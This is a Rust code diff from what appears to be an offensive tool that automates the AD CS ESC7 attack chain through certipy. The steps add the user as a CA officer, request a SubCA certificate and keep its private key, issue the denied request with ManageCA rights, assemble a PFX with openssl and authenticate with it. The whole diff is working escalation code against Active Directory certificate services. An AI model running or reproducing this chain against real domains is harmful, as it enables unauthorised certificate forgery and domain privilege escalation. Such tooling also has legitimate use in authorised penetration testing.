@@ -268,16 +268,17 @@ pub async fn certipy_esc7_full_chain(args: &Value) -> Result<ToolOutput> {
     let mut outputs = Vec::new();
 
     // Step 1: Add self as CA officer (certipy v5 requires principal as arg)
-    let step1 = CommandBuilder::new("certipy")
+    let mut step1_cmd = CommandBuilder::new("certipy")
         .arg("ca")
         .flag("-username", &user_at_domain)
         .flag("-password", password)
         .flag("-dc-ip", dc_ip)
         .flag("-ca", ca)
-        .flag("-add-officer", &user_at_domain)
-        .timeout_secs(120)
-        .execute()
-        .await?;
+        .flag("-add-officer", username);
+    if let Some(t) = &target {
+        step1_cmd = step1_cmd.flag("-target", *t);
+    }
+    let step1 = step1_cmd.timeout_secs(120).execute().await?;
     outputs.push(("Add Officer", step1));
 
     // Step 2: Request cert with SubCA template (will be denied/pending)
@@ -302,7 +303,9 @@ pub async fn certipy_esc7_full_chain(args: &Value) -> Result<ToolOutput> {
     if let Some(s) = &sid {
         req_cmd = req_cmd.flag("-sid", *s);
     }
-    let step2 = req_cmd.timeout_secs(120).execute().await?;
+    // Certipy asks "Would you like to save the private key? (y/N)" when the
+    // SubCA request is denied — we need to answer "y" to keep the key for later.
+    let step2 = req_cmd.stdin("y\n").timeout_secs(120).execute().await?;
 
     // Parse the request ID from certipy output (e.g., "Request ID is 42")
     let request_id = step2
@@ -339,16 +342,17 @@ pub async fn certipy_esc7_full_chain(args: &Value) -> Result<ToolOutput> {
     };
 
     // Step 3: Issue the pending request using ManageCA rights
-    let step3 = CommandBuilder::new("certipy")
+    let mut step3_cmd = CommandBuilder::new("certipy")
         .arg("ca")
         .flag("-username", &user_at_domain)
         .flag("-password", password)
         .flag("-dc-ip", dc_ip)
         .flag("-ca", ca)
-        .flag("-issue-request", req_id.to_string())
-        .timeout_secs(120)
-        .execute()
-        .await?;
+        .flag("-issue-request", req_id.to_string());
+    if let Some(t) = &target {
+        step3_cmd = step3_cmd.flag("-target", *t);
+    }
+    let step3 = step3_cmd.timeout_secs(120).execute().await?;
     outputs.push(("Issue Request", step3));
 
     // Step 4: Retrieve the issued certificate
@@ -367,8 +371,28 @@ pub async fn certipy_esc7_full_chain(args: &Value) -> Result<ToolOutput> {
     let step4_out = step4.timeout_secs(120).execute().await?;
     outputs.push(("Retrieve Cert", step4_out));
 
-    // Step 5: Authenticate with the retrieved PFX
+    // Step 4b: If certipy couldn't create a PFX (key mismatch), combine manually
     let pfx_path = format!("{out_name}.pfx");
+    let crt_path = format!("{out_name}.crt");
+    let key_path = format!("{out_name}.key");
+    if !tokio::fs::try_exists(&pfx_path).await.unwrap_or(false)
+        && tokio::fs::try_exists(&crt_path).await.unwrap_or(false)
+        && tokio::fs::try_exists(&key_path).await.unwrap_or(false)
+    {
+        let combine = CommandBuilder::new("openssl")
+            .arg("pkcs12")
+            .flag("-in", &crt_path)
+            .flag("-inkey", &key_path)
+            .arg("-export")
+            .flag("-out", &pfx_path)
+            .flag("-passout", "pass:")
+            .timeout_secs(30)
+            .execute()
+            .await?;
+        outputs.push(("Combine PFX", combine));
+    }
+
+    // Step 5: Authenticate with the retrieved PFX
     let _ = tokio::process::Command::new("sh")
         .arg("-c")
         .arg("rm -f *.ccache 2>/dev/null")
